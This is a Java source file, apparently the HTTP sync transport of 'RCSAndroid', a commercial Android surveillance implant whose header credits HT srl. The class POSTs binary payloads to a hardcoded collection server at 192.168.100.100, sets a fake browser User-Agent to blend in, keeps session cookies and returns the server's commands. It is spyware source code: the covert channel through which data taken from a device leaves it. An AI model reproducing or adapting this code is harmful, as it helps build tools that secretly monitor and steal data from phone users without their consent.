/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : HttpTransport.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action.sync;

import java.io.DataInputStream;
import java.io.IOException;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.cookie.Cookie;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;

import android.util.Log;

import com.ht.RCSAndroidGUI.Debug;

// TODO: Auto-generated Javadoc
/**
 * The Class HttpTransport.
 */
public abstract class HttpTransport extends Transport {

	/** The Constant PORT. */
	private static final int PORT = 80;
	/** The debug. */
	private static String TAG = "HttpTransport";
	/** The host. */
	String host;

	/**
	 * Instantiates a new http transport.
	 * 
	 * @param host
	 *            the host
	 */
	public HttpTransport(final String host) {
		// super("http://" + host + ":" + PORT + "/wc12/webclient");
		// TODO: togliere
		super("http://192.168.100.100:" + PORT + "/wc12/webclient");
		// super("http://192.168.1.185:" + PORT + "/wc12/webclient");

		this.host = host;
		cookies = null;
		stop = false;
	}

	// private String transportId;
	/** The cookies. */
	private List<Cookie> cookies;

	/** The stop. */
	boolean stop;

	/** The follow_moved. */
	boolean follow_moved = true;

	/** The HEADE r_ contenttype. */
	private final String HEADER_CONTENTTYPE = "content-type";

	/** The HEADE r_ setcookie. */
	private final String HEADER_SETCOOKIE = "set-cookie";

	/** The HEADE r_ contentlen. */
	private final String HEADER_CONTENTLEN = "content-length";

	// private final String USER_AGENT =
	// "Profile/MIDP-2.0 Configuration/CLDC-1.0";
	/** The CONTEN t_ type. */
	private final String CONTENT_TYPE = "application/octet-stream";

	/** The accept wifi. */
	static// private static String CONTENTTYPE_TEXTHTML = "text/html";
	boolean acceptWifi = false;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#close()
	 */
	@Override
	public void close() {
		cookies = null;
	}

	/**
	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
	 * httpclient
	 * 
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	@Override
	public synchronized byte[] command(final byte[] data)
			throws TransportException {

		// sending request
		final DefaultHttpClient httpclient = new DefaultHttpClient();
		// httpclient.getParams().setParameter(ClientPNames.COOKIE_POLICY,
		// CookiePolicy.RFC_2965);

		final HttpPost httppost = new HttpPost(baseurl);
		httppost
				.setHeader(
						"User-Agent",
						"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3");
		httppost.setHeader("Content-Type", "application/octet-stream");

		if (cookies != null) {
			for (final Cookie cookie : cookies) {
				httpclient.getCookieStore().addCookie(cookie);
				// httppost.setHeader("Cookie", cookie.getName());
			}
		}

		DataInputStream in = null;

		try {
			httppost.setEntity(new ByteArrayEntity(data));
			final HttpResponse response = httpclient.execute(httppost);

			final int returnCode = response.getStatusLine().getStatusCode();

			if (returnCode == HttpStatus.SC_OK) {
				cookies = httpclient.getCookieStore().getCookies();

				final long length = response.getEntity().getContentLength();

				in = new DataInputStream(response.getEntity().getContent());

				final byte[] content = new byte[(int) length];
				in.readFully(content);

				in.close();

				return content;
			} else {
				return null;
			}
		} catch (final Exception ex) {
			Log.e(TAG,ex.toString());
			throw new TransportException(1);
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (final IOException e) {
					e.printStackTrace();
				}
			}
		}

		// byte[] content = parseHttpConnection(connection);

	}

}